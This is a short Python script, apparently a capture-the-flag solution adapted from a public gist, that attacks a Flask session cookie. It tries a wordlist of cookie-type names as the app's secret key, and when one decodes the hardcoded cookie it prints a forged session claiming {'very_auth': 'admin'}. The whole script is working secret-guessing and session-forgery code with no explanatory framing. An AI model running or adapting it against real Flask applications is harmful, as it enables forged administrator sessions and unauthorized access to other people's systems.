# Taken from: https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter",
                "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop",
                "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie",
                "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

COOKIE = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YQk02A.8PEHmVeu0mqc5ls6lFNPc3ZqpII"


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)


def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)


# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)


for key in cookie_names:
    try:
        decodeFlaskCookie(key, COOKIE)
        print(encodeFlaskCookie(key, {"very_auth": "admin"}))
    except:
        pass
